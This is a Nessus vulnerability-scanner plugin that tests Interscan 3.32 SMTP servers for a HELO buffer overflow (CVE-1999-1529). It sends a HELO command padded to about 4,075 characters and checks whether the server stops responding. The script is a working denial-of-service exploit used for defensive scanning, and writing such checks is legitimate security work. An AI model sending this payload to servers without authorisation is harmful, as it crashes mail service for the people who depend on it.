#
# This script was written by Alain Thivillon <Alain.Thivillon@hsc.fr>
#
# Script audit and contributions from Carmichael Security 
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CVE
#
# See the Nessus Scripts License for details
#


include("compat.inc");

if(description)
{
 script_id(10353);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-1999-1529");
 script_bugtraq_id(787);
 script_xref(name:"OSVDB", value:"6174");

 script_name(english:"Interscan 3.32 SMTP HELO Command Remote Overflow DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote MTA is vulnerable to a Denial of Service attack." );
 script_set_attribute(attribute:"description", value:
"It was possible to perform a denial of service against the remote
Interscan SMTP server by sending it a special long HELO command. 

This problem allows an attacker to prevent your Interscan SMTP server 
from handling requests." );
 script_set_attribute(attribute:"solution", value:
"Contact your vendor for a patch." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 script_summary(english:"Crashes the Interscan NT SMTP Server");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2000-2009 Renaud Deraison and Alain Thivillon");
 script_family(english:"SMTP problems");
 script_dependencie("find_service1.nasl");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("smtp_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if(!get_port_state(port))exit(0);

banner = get_smtp_banner (port:port);
if ("InterScan" >!< banner)
  exit (0);

 soc = open_sock_tcp(port);
 if(soc)
 {
   s = smtp_recv_banner(socket:soc);
   if(s)
   {
   c = string("HELO a\r\n");
   send(socket:soc, data:c);
   s = recv_line(socket:soc, length:5000);
   if(!s)exit(0);
   c = string("HELO ", crap(length:4075, data:"."),"\r\n");
   send(socket:soc, data:c);
   s = recv_line(socket:soc, length:5000);
   if(!s) { security_warning(port); exit(0) ; }
   c = string("HELO a\r\n");
   send(socket:soc, data:c);
   s = recv_line(socket:soc, length:2048, timeout:20);
   if(!s) { security_warning(port); exit(0); }
   }
   close(soc);
 }
	
